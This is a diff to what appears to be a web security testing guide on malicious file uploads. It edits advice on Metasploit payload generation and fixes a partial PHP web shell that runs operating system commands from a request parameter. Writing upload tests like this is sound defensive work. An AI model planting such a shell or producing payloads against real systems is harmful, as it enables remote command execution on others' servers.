@@ -27,14 +27,11 @@ Suppose a picture sharing application allows users to upload their `.gif` or `.j
 - Try to upload the malicious file to the application/system and verify that it is correctly rejected.
 - If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.
 
-### Exploit Payload
-
-- Using the Metasploit payload generation functionality generates a shellcode as a Windows executable using the Metasploit “msfpayload” command.
-- Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected.
-
-### Malicious File
+### Malicious Files
 
 Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/?page_id=3950), which is an safe file that is flagged as malicious by all anti-malware software.
+
+Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) can be used to generate malicious files for various formats.
 
 When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.
 
@@ -52,7 +49,7 @@ The example below shows a simple PHP based shell, that executes operating system
 
 ```php
 <?php
-    if $_SERVER['REMOTE_HOST'] === "FIXME" { // Set your IP address here
+    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
         if(isset($_REQUEST['cmd'])){
             $cmd = ($_REQUEST['cmd']);
             echo "<pre>\n";
